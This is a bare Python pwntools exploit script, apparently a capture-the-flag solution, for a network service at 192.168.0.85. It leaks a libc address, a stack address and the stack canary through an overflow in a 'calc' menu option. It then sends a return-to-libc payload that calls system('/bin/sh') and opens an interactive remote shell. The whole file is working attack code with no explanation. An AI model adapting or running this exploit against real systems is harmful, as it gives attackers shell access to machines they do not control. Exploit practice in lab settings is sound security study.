from pwn import *
import os
s = remote('192.168.0.85',1234)
def calc(size,dat):
  s.recvuntil('Choice:')
  s.send('1\n')
  s.recvuntil('What is the length of your data: ')
  s.send(str(size)+'\n')
  s.recvuntil('Please send me %d bytes to process: '%size)
  s.send(dat+'\n')
calc(0x4,'A'*0x64+p32(0x08049FE4))
r = int(s.recvuntil('-')[-12:-1],16)
import subprocess
p = subprocess.Popen(["pypy",'k.py','%x'%r,'libc'], stdout=subprocess.PIPE)
libc = int(p.stdout.read(),10) - 0x5fca0
log.info('LIBC : 0x%x'%libc)

calc(0x4,'A'*0x64+p32(libc+0x1b3dbc))
r = int(s.recvuntil('-')[-12:-1],16)
p = subprocess.Popen(["pypy",'k.py','%x'%r,'stack'], stdout=subprocess.PIPE)
stack = int(p.stdout.read(),10)
log.info('STACK : 0x%x'%stack)

calc(0x4,'A'*0x64+p32(stack-0xd0))
r = int(s.recvuntil('-')[-12:-1],16)
p = subprocess.Popen(["pypy",'k.py','%x'%r,'canary'], stdout=subprocess.PIPE)
canary = int(p.stdout.read(),10)
log.info('CANARY : 0x%x'%canary)
s.recvuntil('Choice:')
dat = '/bin/sh\x00'
dat += 'A'*(0x28-len(dat))
dat += p32(canary)
dat += p32(0)*4
dat += p32(libc+0x3ada0)
dat += 'AAAA'
dat += p32(stack-0x188)
s.send(dat+'\n')
s.interactive()
